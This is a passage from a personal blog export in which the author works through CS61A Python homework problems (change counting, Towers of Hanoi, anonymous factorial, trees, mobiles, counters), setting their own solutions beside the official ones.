<p>See the walkthrough for a more thorough explanation and a visual of the recursive calls. Video walkthrough: <a href="https://youtu.be/EgZJPNFnoxM" target="_blank" rel="noopener">https://youtu.be/EgZJPNFnoxM</a>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_change</span><span class="params">(amount)</span>:</span></span><br><span class="line">    <span class="string">"""Return the number of ways to make change for amount.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_change(7)</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_change(10)</span></span><br><span class="line"><span class="string">    14</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_change(20)</span></span><br><span class="line"><span class="string">    60</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_change(100)</span></span><br><span class="line"><span class="string">    9828</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from construct_check import check</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'count_change', ['While', 'For'])</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">constrained_count</span><span class="params">(amount, smallest_coin)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> amount == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> smallest_coin &gt; amount:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        without_coin = constrained_count(amount, smallest_coin * <span class="number">2</span>)</span><br><span class="line">        with_coin = constrained_count(amount - smallest_coin, smallest_coin)</span><br><span class="line">        <span class="keyword">return</span> without_coin + with_coin</span><br><span class="line">    <span class="keyword">return</span> constrained_count(amount, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h1 id="Q5-Towers-of-Hanoi"><a href="#Q5-Towers-of-Hanoi" class="headerlink" title="Q5: Towers of Hanoi"></a>Q5: Towers of Hanoi</h1><p>A classic puzzle called the Towers of Hanoi is a game that consists of three rods, and a number of disks of different sizes which can slide onto any rod. The puzzle starts with <code>n</code> disks in a neat stack in ascending order of size on a <code>start</code> rod, the smallest at the top, forming a conical shape.</p>


<p>The objective of the puzzle is to move the entire stack to an <code>end</code> rod, obeying the following rules:</p>
<ul>
<li>Only one disk may be moved at a time.</li>
<li>Each move consists of taking the top (smallest) disk from one of the rods and sliding it onto another rod, on top of the other disks that may already be present on that rod.</li>
<li>No disk may be placed on top of a smaller disk.<br>Complete the definition of <code>move_stack</code>, which prints out the steps required to move <code>n</code> disks from the <code>start</code> rod to the <code>end</code> rod without violating the rules. The provided <code>print_move</code> function will print out the step to move a single disk from the given <code>origin</code> to the given <code>destination</code>.</li>
</ul>
<p><em>Hint: Draw out a few games with various <code>n</code> on a piece of paper and try to find a pattern of disk movements that applies to any <code>n</code>. In your solution, take the recursive leap of faith whenever you need to move any amount of disks less than <code>n</code> from one rod to another.</em></p>
<p><span style="color:red">My solution: We can simply think this question as recursion. The base case is when n is 1, then we only need to move the disk from start to end, otherwise we first need to move n - 1 disks from start to median, which is calculated by 6 - start - end. Then we need to move the largest disk to the end rod. Last we need to move the median n - 1 disks to end rod.</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_move</span><span class="params">(origin, destination)</span>:</span></span><br><span class="line">    <span class="string">"""Print instructions to move a disk."""</span></span><br><span class="line">    print(<span class="string">"Move the top disk from rod"</span>, origin, <span class="string">"to rod"</span>, destination)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move_stack</span><span class="params">(n, start, end)</span>:</span></span><br><span class="line">    <span class="string">"""Print the moves required to move n disks on the start pole to the end</span></span><br><span class="line"><span class="string">    pole without violating the rules of Towers of Hanoi.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    n -- number of disks</span></span><br><span class="line"><span class="string">    start -- a pole position, either 1, 2, or 3</span></span><br><span class="line"><span class="string">    end -- a pole position, either 1, 2, or 3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    There are exactly three poles, and start and end must be different. Assume</span></span><br><span class="line"><span class="string">    that the start pole has at least n disks of increasing size, and the end</span></span><br><span class="line"><span class="string">    pole is either empty or has a top disk larger than the top n start disks.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; move_stack(1, 1, 3)</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; move_stack(2, 1, 3)</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 2</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 3</span></span><br><span class="line"><span class="string">    Move the top disk from rod 2 to rod 3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; move_stack(3, 1, 3)</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 3</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 2</span></span><br><span class="line"><span class="string">    Move the top disk from rod 3 to rod 2</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 3</span></span><br><span class="line"><span class="string">    Move the top disk from rod 2 to rod 1</span></span><br><span class="line"><span class="string">    Move the top disk from rod 2 to rod 3</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 3</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="number">1</span> &lt;= start &lt;= <span class="number">3</span> <span class="keyword">and</span> <span class="number">1</span> &lt;= end &lt;= <span class="number">3</span> <span class="keyword">and</span> start != end, <span class="string">"Bad start/end"</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        print_move(start, end)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    median = <span class="number">6</span> - start - end</span><br><span class="line">    move_stack(n - <span class="number">1</span>, start, median)</span><br><span class="line">    move_stack(<span class="number">1</span>, start, end)</span><br><span class="line">    move_stack(n - <span class="number">1</span>, median, end)</span><br></pre></td></tr></table></figure>
<p><span style="color: red">The pdf solution:</span><br>To solve the Towers of Hanoi problem for n disks, we need to do three steps:</p>
<p>Move everything but the last disk (n-1 disks) to someplace in the middle (not the start nor the end rod).<br>Move the last disk (a single disk) to the end rod. This must occur after step 1 (we have to move everything above it away first)!<br>Move everything but the last disk (the disks from step 1) from the middle on top of the end rod.<br>We take advantage of the fact that the recursive function move_stack is guaranteed to move n disks from start to end while obeying the rules of Towers of Hanoi. The only thing that remains is to make sure that we have set up the playing board to make that possible.</p>
<p>Since we move a disk to end rod, we run the risk of move_stack doing an improper move (big disk on top of small disk). But since we’re moving the biggest disk possible, nothing in the n-1 disks above that is bigger. Therefore, even though we do not explicitly state the Towers of Hanoi constraints, we can still carry out the correct steps.</p>
<p>Video walkthrough: <a href="https://youtu.be/VwynGQiCTFM" target="_blank" rel="noopener">https://youtu.be/VwynGQiCTFM</a></span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_move</span><span class="params">(origin, destination)</span>:</span></span><br><span class="line">    <span class="string">"""Print instructions to move a disk."""</span></span><br><span class="line">    print(<span class="string">"Move the top disk from rod"</span>, origin, <span class="string">"to rod"</span>, destination)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move_stack</span><span class="params">(n, start, end)</span>:</span></span><br><span class="line">    <span class="string">"""Print the moves required to move n disks on the start pole to the end</span></span><br><span class="line"><span class="string">    pole without violating the rules of Towers of Hanoi.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    n -- number of disks</span></span><br><span class="line"><span class="string">    start -- a pole position, either 1, 2, or 3</span></span><br><span class="line"><span class="string">    end -- a pole position, either 1, 2, or 3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    There are exactly three poles, and start and end must be different. Assume</span></span><br><span class="line"><span class="string">    that the start pole has at least n disks of increasing size, and the end</span></span><br><span class="line"><span class="string">    pole is either empty or has a top disk larger than the top n start disks.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; move_stack(1, 1, 3)</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; move_stack(2, 1, 3)</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 2</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 3</span></span><br><span class="line"><span class="string">    Move the top disk from rod 2 to rod 3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; move_stack(3, 1, 3)</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 3</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 2</span></span><br><span class="line"><span class="string">    Move the top disk from rod 3 to rod 2</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 3</span></span><br><span class="line"><span class="string">    Move the top disk from rod 2 to rod 1</span></span><br><span class="line"><span class="string">    Move the top disk from rod 2 to rod 3</span></span><br><span class="line"><span class="string">    Move the top disk from rod 1 to rod 3</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="number">1</span> &lt;= start &lt;= <span class="number">3</span> <span class="keyword">and</span> <span class="number">1</span> &lt;= end &lt;= <span class="number">3</span> <span class="keyword">and</span> start != end, <span class="string">"Bad start/end"</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        print_move(start, end)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        other = <span class="number">6</span> - start - end</span><br><span class="line">        move_stack(n<span class="number">-1</span>, start, other)</span><br><span class="line">        print_move(start, end)</span><br><span class="line">        move_stack(n<span class="number">-1</span>, other, end)</span><br></pre></td></tr></table></figure>

<h1 id="Q6-Anonymous-factorial"><a href="#Q6-Anonymous-factorial" class="headerlink" title="Q6: Anonymous factorial"></a>Q6: Anonymous factorial</h1><p>The recursive factorial function can be written as a single expression by using a conditional expression.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; fact &#x3D; lambda n: 1 if n &#x3D;&#x3D; 1 else mul(n, fact(sub(n, 1)))</span><br><span class="line">&gt;&gt;&gt; fact(5)</span><br><span class="line">120</span><br></pre></td></tr></table></figure>
<p>However, this implementation relies on the fact (no pun intended) that <code>fact</code> has a name, to which we refer in the body of <code>fact</code>. To write a recursive function, we have always given it a name using a <code>def</code> or assignment statement so that we can refer to the function within its own body. In this question, your job is to define fact recursively without giving it a name!</p>
<p>Write an expression that computes <code>n</code> factorial using only call expressions, conditional expressions, and lambda expressions (no assignment or def statements). Note in particular that you are not allowed to use <code>make_anonymous_factorial</code> in your return expression. The <code>sub</code> and <code>mul</code> functions from the <code>operator</code> module are the only built-in functions required to solve this problem:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> sub, mul</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_anonymous_factorial</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Return the value of an expression that computes factorial.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; make_anonymous_factorial()(5)</span></span><br><span class="line"><span class="string">    120</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from construct_check import check</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'make_anonymous_factorial', ['Assign', 'AugAssign', 'FunctionDef', 'Recursion'])</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">lambda</span> f: <span class="keyword">lambda</span> k: f(f, k))(<span class="keyword">lambda</span> f, k: k <span class="keyword">if</span> k == <span class="number">1</span> <span class="keyword">else</span> mul(k, f(f, sub(k, <span class="number">1</span>))))</span><br><span class="line">    <span class="comment"># Alternate solution:</span></span><br><span class="line">    <span class="comment">#   return (lambda f: f(f))(lambda f: lambda x: 1 if x == 0 else x * f(f)(x - 1))</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-hw05</title>
    <url>/2018/10/16/cs61a-hw05/</url>
    <content><![CDATA[<h1 id="Trees"><a href="#Trees" class="headerlink" title="Trees"></a>Trees</h1><h2 id="Q1-Replace-Leaf"><a href="#Q1-Replace-Leaf" class="headerlink" title="Q1: Replace Leaf"></a>Q1: Replace Leaf</h2><p>Define <code>replace_leaf</code>, which takes a tree <code>t</code>, a value <code>old</code>, and a value <code>new</code>. <code>replace_leaf</code> returns a new tree that’s the same as <code>t</code> except that every leaf value equal to <code>old</code> has been replaced with <code>new</code>.</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replace_leaf</span><span class="params">(t, old, new)</span>:</span></span><br><span class="line">   <span class="string">"""Returns a new tree where every leaf value equal to old has</span></span><br><span class="line"><span class="string">   been replaced with new.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; yggdrasil = tree('odin',</span></span><br><span class="line"><span class="string">   ...                  [tree('balder',</span></span><br><span class="line"><span class="string">   ...                        [tree('thor'),</span></span><br><span class="line"><span class="string">   ...                         tree('loki')]),</span></span><br><span class="line"><span class="string">   ...                   tree('frigg',</span></span><br><span class="line"><span class="string">   ...                        [tree('thor')]),</span></span><br><span class="line"><span class="string">   ...                   tree('thor',</span></span><br><span class="line"><span class="string">   ...                        [tree('sif'),</span></span><br><span class="line"><span class="string">   ...                         tree('thor')]),</span></span><br><span class="line"><span class="string">   ...                   tree('thor')])</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; laerad = copy_tree(yggdrasil) # copy yggdrasil for testing purposes</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; print_tree(replace_leaf(yggdrasil, 'thor', 'freya'))</span></span><br><span class="line"><span class="string">   odin</span></span><br><span class="line"><span class="string">     balder</span></span><br><span class="line"><span class="string">       freya</span></span><br><span class="line"><span class="string">       loki</span></span><br><span class="line"><span class="string">     frigg</span></span><br><span class="line"><span class="string">       freya</span></span><br><span class="line"><span class="string">     thor</span></span><br><span class="line"><span class="string">       sif</span></span><br><span class="line"><span class="string">       freya</span></span><br><span class="line"><span class="string">     freya</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; laerad == yggdrasil # Make sure original tree is unmodified</span></span><br><span class="line"><span class="string">   True</span></span><br><span class="line"><span class="string">   """</span></span><br><span class="line">   <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">   <span class="keyword">if</span> is_leaf(t) <span class="keyword">and</span> label(t) == old:</span><br><span class="line">       <span class="keyword">return</span> tree(new)</span><br><span class="line">   <span class="keyword">return</span> tree(label(t), [replace_leaf(b, old, new) <span class="keyword">for</span> b <span class="keyword">in</span> branches(t)])</span><br></pre></td></tr></table></figure>

<h1 id="Mobiles"><a href="#Mobiles" class="headerlink" title="Mobiles"></a>Mobiles</h1><p><strong>Acknowledgements</strong>. This mobile example is based on a classic problem from Structure and Interpretation of Computer Programs, Section 2.2.2.</p>
<p>A mobile is a type of hanging sculpture. A binary mobile consists of two sides. Each side is a rod of a certain length, from which hangs either a weight or another mobile.</p>
<p>We will represent a binary mobile using the data abstractions below.</p>
<ul>
<li>A <code>mobile</code> has a left <code>side</code> and a right <code>side</code>.</li>
<li>A <code>side</code> has a positive length and something hanging at the end, either a <code>mobile</code> or <code>weight</code>.</li>
<li>A <code>weight</code> has a positive size.<h2 id="Q2-Weights"><a href="#Q2-Weights" class="headerlink" title="Q2: Weights"></a>Q2: Weights</h2>Implement the <code>weight</code> data abstraction by completing the <code>weight</code> constructor and the <code>size</code> selector so that a weight is represented using a two-element list where the first element is the string <code>&#39;weight&#39;</code>. The <code>total_weight</code> example is provided to demonstrate use of the mobile, side, and weight abstractions.</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mobile</span><span class="params">(left, right)</span>:</span></span><br><span class="line">    <span class="string">"""Construct a mobile from a left side and a right side."""</span></span><br><span class="line">    <span class="keyword">assert</span> is_side(left), <span class="string">"left must be a side"</span></span><br><span class="line">    <span class="keyword">assert</span> is_side(right), <span class="string">"right must be a side"</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">'mobile'</span>, left, right]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_mobile</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="string">"""Return whether m is a mobile."""</span></span><br><span class="line">    <span class="keyword">return</span> type(m) == list <span class="keyword">and</span> len(m) == <span class="number">3</span> <span class="keyword">and</span> m[<span class="number">0</span>] == <span class="string">'mobile'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="string">"""Select the left side of a mobile."""</span></span><br><span class="line">    <span class="keyword">assert</span> is_mobile(m), <span class="string">"must call left on a mobile"</span></span><br><span class="line">    <span class="keyword">return</span> m[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">right</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="string">"""Select the right side of a mobile."""</span></span><br><span class="line">    <span class="keyword">assert</span> is_mobile(m), <span class="string">"must call right on a mobile"</span></span><br><span class="line">    <span class="keyword">return</span> m[<span class="number">2</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">side</span><span class="params">(length, mobile_or_weight)</span>:</span></span><br><span class="line">    <span class="string">"""Construct a side: a length of rod with a mobile or weight at the end."""</span></span><br><span class="line">    <span class="keyword">assert</span> is_mobile(mobile_or_weight) <span class="keyword">or</span> is_weight(mobile_or_weight)</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">'side'</span>, length, mobile_or_weight]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_side</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Return whether s is a side."""</span></span><br><span class="line">    <span class="keyword">return</span> type(s) == list <span class="keyword">and</span> len(s) == <span class="number">3</span> <span class="keyword">and</span> s[<span class="number">0</span>] == <span class="string">'side'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">length</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Select the length of a side."""</span></span><br><span class="line">    <span class="keyword">assert</span> is_side(s), <span class="string">"must call length on a side"</span></span><br><span class="line">    <span class="keyword">return</span> s[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">end</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Select the mobile or weight hanging at the end of a side."""</span></span><br><span class="line">    <span class="keyword">assert</span> is_side(s), <span class="string">"must call end on a side"</span></span><br><span class="line">    <span class="keyword">return</span> s[<span class="number">2</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">weight</span><span class="params">(size)</span>:</span></span><br><span class="line">    <span class="string">"""Construct a weight of some size."""</span></span><br><span class="line">    <span class="keyword">assert</span> size &gt; <span class="number">0</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">'weight'</span>, size]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">size</span><span class="params">(w)</span>:</span></span><br><span class="line">    <span class="string">"""Select the size of a weight."""</span></span><br><span class="line">    <span class="keyword">assert</span> is_weight(w), <span class="string">'must call size on a weight'</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> w[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_weight</span><span class="params">(w)</span>:</span></span><br><span class="line">    <span class="string">"""Whether w is a weight."""</span></span><br><span class="line">    <span class="keyword">return</span> type(w) == list <span class="keyword">and</span> len(w) == <span class="number">2</span> <span class="keyword">and</span> w[<span class="number">0</span>] == <span class="string">'weight'</span></span><br></pre></td></tr></table></figure>

<h2 id="Q3-Balanced"><a href="#Q3-Balanced" class="headerlink" title="Q3: Balanced"></a>Q3: Balanced</h2><p>Implement the <code>balanced</code> function, which returns whether <code>m</code> is a balanced mobile. A mobile is balanced if two conditions are met:</p>
<ol>
<li>The torque(转矩) applied by its left side is equal to that applied by its right side. Torque of the left side is the length of the left rod multiplied by the total weight hanging from that rod. Likewise for the right.</li>
<li>Each of the mobiles hanging at the end of its sides is balanced.<br>Hint: You may find it helpful to assume that weights themselves are balanced.</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balanced</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="string">"""Return whether m is balanced.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t, u, v = examples()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; balanced(t)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; balanced(v)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w = mobile(side(3, t), side(2, u))</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; balanced(w)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; balanced(mobile(side(1, v), side(1, w)))</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; balanced(mobile(side(1, w), side(1, v)))</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> is_weight(m):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        left_end, right_end = end(left(m)), end(right(m))</span><br><span class="line">        torque_left = length(left(m)) * total_weight(left_end)</span><br><span class="line">        torque_right = length(right(m)) * total_weight(right_end)</span><br><span class="line">        <span class="keyword">return</span> torque_left == torque_right <span class="keyword">and</span> balanced(left_end) <span class="keyword">and</span> balanced(right_end)</span><br></pre></td></tr></table></figure>

<p><span style="color:red">The balanced weights assumption is important, since we will be solving this recursively like many other tree problems (even though this is not explicitly a tree).</span></p>
<p><span style="color:red"><strong>Base case</strong>: if we are checking a weight, then we know that this is balanced. Why is this an appropriate base case? There are two possible approaches to this:</span></p>
<p><span style="color:red">1. Because we know that our data structures so far are trees, weights are the simplest possible tree since we have chosen to implement them as leaves.</span><br><span style="color:red">2. We also know that from an ADT standpoint, weights are the terminal item in a mobile. There can be no further mobile structures under this weight, so it makes sense to stop check here.</span><br><span style="color:red"><strong>Otherwise</strong>: note that it is important to do a recursive call to check if both sides are balanced. However, we also need to do the basic comparison of looking at the total weight of both sides as well as their length. For example if both sides are a weight, trivially, they will both be balanced. However, the torque must be equal in order for the entire mobile to balanced (i.e. it’s insufficient to just check if the sides are balanced).</span></p>
<h2 id="Q4-Totals"><a href="#Q4-Totals" class="headerlink" title="Q4: Totals"></a>Q4: Totals</h2><p>Implement <code>totals_tree</code>, which takes a <code>mobile</code> (or <code>weight</code>) and returns a <code>tree</code> whose root is its total weight and whose branches are trees for the ends of the sides.<br><span style="color:red">My solution</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">totals_tree</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="string">"""Return a tree representing the mobile with its total weight at the root.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t, u, v = examples()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(totals_tree(t))</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">      1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(totals_tree(u))</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">      1</span></span><br><span class="line"><span class="string">      5</span></span><br><span class="line"><span class="string">        3</span></span><br><span class="line"><span class="string">        2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(totals_tree(v))</span></span><br><span class="line"><span class="string">    9</span></span><br><span class="line"><span class="string">      3</span></span><br><span class="line"><span class="string">        2</span></span><br><span class="line"><span class="string">        1</span></span><br><span class="line"><span class="string">      6</span></span><br><span class="line"><span class="string">        1</span></span><br><span class="line"><span class="string">        5</span></span><br><span class="line"><span class="string">          3</span></span><br><span class="line"><span class="string">          2</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> is_weight(m):</span><br><span class="line">        <span class="keyword">return</span> tree(total_weight(m))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> tree(total_weight(m), [totals_tree(end(left(m))), totals_tree(end(right(m)))])</span><br></pre></td></tr></table></figure>
<p><span style="color:red">The PDF solution, which I think is so intellectual!!</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">totals_tree</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="string">"""Return a tree representing the mobile with its total weight at the root.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t, u, v = examples()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(totals_tree(t))</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">      1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(totals_tree(u))</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">      1</span></span><br><span class="line"><span class="string">      5</span></span><br><span class="line"><span class="string">        3</span></span><br><span class="line"><span class="string">        2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(totals_tree(v))</span></span><br><span class="line"><span class="string">    9</span></span><br><span class="line"><span class="string">      3</span></span><br><span class="line"><span class="string">        2</span></span><br><span class="line"><span class="string">        1</span></span><br><span class="line"><span class="string">      6</span></span><br><span class="line"><span class="string">        1</span></span><br><span class="line"><span class="string">        5</span></span><br><span class="line"><span class="string">          3</span></span><br><span class="line"><span class="string">          2</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> is_weight(m):</span><br><span class="line">        <span class="keyword">return</span> tree(size(m))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        branches = [totals_tree(end(f(m))) <span class="keyword">for</span> f <span class="keyword">in</span> [left, right]]</span><br><span class="line">        <span class="keyword">return</span> tree(sum([label(b) <span class="keyword">for</span> b <span class="keyword">in</span> branches]), branches)</span><br></pre></td></tr></table></figure>
<h1 id="Mutable-functions"><a href="#Mutable-functions" class="headerlink" title="Mutable functions"></a>Mutable functions</h1><h2 id="Q5-Counter"><a href="#Q5-Counter" class="headerlink" title="Q5: Counter"></a>Q5: Counter</h2><p>Define a function <code>make_counter</code> that returns a <code>counter</code> function, which takes a string and returns the number of times that the function has been called on that string.<br><span style="color:red">My solution(a little stupid, not general)</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_counter</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Return a counter function.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c = make_counter()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('a')</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('a')</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('b')</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('a')</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c2 = make_counter()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c2('b')</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c2('b')</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('b') + c2('b')</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    m = &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(s)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> m.get(s, <span class="number">0</span>) == <span class="number">0</span>:</span><br><span class="line">            m[s] = <span class="number">1</span></span><br><span class="line">        <span 